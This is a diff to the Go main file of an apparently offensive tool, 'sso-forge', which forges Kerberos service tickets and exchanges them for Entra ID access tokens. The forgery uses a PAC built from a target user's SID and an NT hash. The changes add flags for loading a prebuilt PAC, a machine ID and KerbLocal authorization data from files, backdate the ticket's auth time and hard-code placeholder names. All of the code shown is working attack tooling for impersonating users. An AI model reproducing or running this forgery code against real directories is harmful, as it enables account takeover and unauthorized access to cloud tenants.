@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"os"
 	"strings"
+	"time"
 
 	"github.com/skewwbox/sso-forge/internal/discovery"
 	"github.com/skewwbox/sso-forge/internal/exchange"
@@ -27,6 +28,9 @@ func main() {
 		realm    = flag.String("realm", "", "Kerberos realm — on-prem AD FQDN in uppercase (e.g., CORP.CONTOSO.COM)")
 		upn      = flag.String("upn", "", "Target user UPN (e.g., user@contoso.com)")
 		ticket   = flag.String("ticket", "", "Pre-generated base64 SPNEGO ticket (skips forge, tests exchange only)")
+		pacFile  = flag.String("pac-file", "", "Pre-built PAC binary file (skips PAC builder)")
+		machID   = flag.String("machine-id", "", "Machine ID binary file for TokenRestrictions")
+		kerbLoc  = flag.String("kerb-local", "", "KerbLocal binary file for auth-data Entry 2")
 		tenantID = flag.String("tenant-id", "", "Entra ID tenant ID (auto-discovered if empty)")
 		resource = flag.String("resource", "https://graph.windows.net", "Target resource URL")
 		clientID = flag.String("client-id", exchange.DefaultClientID, "OAuth2 client ID")
@@ -124,43 +128,88 @@ func main() {
 	// 3. Extract identity details
 	userRID := parseRID(*sid)
 	userName := extractUserName(*upn)
-	// Derive AD domain from Kerberos realm (WINDOMAIN.LOCAL → windomain.local / WINDOMAIN)
-	adFQDN := strings.ToLower(*realm)
-	netBIOS := extractNetBIOS(adFQDN)
+	// Derive AD domain from Kerberos realm (WINDOMAIN.LOCAL → WINDOMAIN)
+	netBIOS := strings.ToUpper(extractNetBIOS(*realm))
 
 	if *verbose {
 		fmt.Fprintf(os.Stderr, "[+] User: %s (RID: %d)\n", userName, userRID)
 	}
 
 	// 4. Build PAC
-	params := &pac.BuildParams{
-		UserSID:       *sid,
-		UserRID:       userRID,
-		DomainNetBIOS: netBIOS,
-		DomainFQDN:    *domain,
-		UPN:           *upn,
-		FullName:      userName,
-		NTHash:        key,
+	var pacBytes []byte
+	var authTimeFT uint64
+	if *pacFile != "" {
+		var err error
+		pacBytes, err = os.ReadFile(*pacFile)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "error: PAC file: %v\n", err)
+			os.Exit(1)
+		}
+		if *verbose {
+			fmt.Fprintf(os.Stderr, "[+] PAC (from file): %d bytes\n", len(pacBytes))
+		}
+	} else {
+		params := &pac.BuildParams{
+			UserSID:       *sid,
+			UserRID:       userRID,
+			DomainNetBIOS: netBIOS,
+			DomainFQDN:    *domain,
+			Realm:         *realm,
+			UPN:           *upn,
+			FullName:      "DisplayName",
+			ServerName:    "DC1.company.com",
+			NTHash:        key,
+		}
+		pacBuilder := pac.NewBuilder(params)
+		now := time.Now().UTC().Truncate(time.Second)
+		authTimeFT = uint64(now.Add(-43 * time.Second).UnixNano()/100 + 116444736000000000)
+		pacBuilder.SetAuthTime(authTimeFT)
+		var err error
+		pacBytes, err = pacBuilder.Build()
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "error: PAC: %v\n", err)
+			os.Exit(1)
+		}
+		if *verbose {
+			fmt.Fprintf(os.Stderr, "[+] PAC: %d bytes\n", len(pacBytes))
+		}
 	}
-	pacBuilder := pac.NewBuilder(params)
-	pacBytes, err := pacBuilder.Build()
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "error: PAC: %v\n", err)
-		os.Exit(1)
-	}
-	if *verbose {
-		fmt.Fprintf(os.Stderr, "[+] PAC: %d bytes\n", len(pacBytes))
-	}
+	_ = userRID
+	_ = netBIOS
 
 	// 5. Forge ticket
-	forged, err := kbticket.Forge(&kbticket.ForgeParams{
+	forgeParams := &kbticket.ForgeParams{
 		Key:           key,
 		EType:         eType,
 		UserPrincipal: *upn,
 		Realm:         *realm,
 		PAC:           pacBytes,
 		UserName:      userName,
-	})
+		AuthTimeFT:    authTimeFT,
+	}
+	if *machID != "" {
+		d, err := os.ReadFile(*machID)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "error: machine-id file: %v\n", err)
+			os.Exit(1)
+		}
+		forgeParams.MachineID = d
+		if *verbose {
+			fmt.Fprintf(os.Stderr, "[+] MachineID (from file): %d bytes\n", len(d))
+		}
+	}
+	if *kerbLoc != "" {
+		d, err := os.ReadFile(*kerbLoc)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "error: kerb-local file: %v\n", err)
+			os.Exit(1)
+		}
+		forgeParams.KerbLocal2 = d
+		if *verbose {
+			fmt.Fprintf(os.Stderr, "[+] KerbLocal (from file): %d bytes\n", len(d))
+		}
+	}
+	forged, err := kbticket.Forge(forgeParams)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "error: forge: %v\n", err)
 		os.Exit(1)
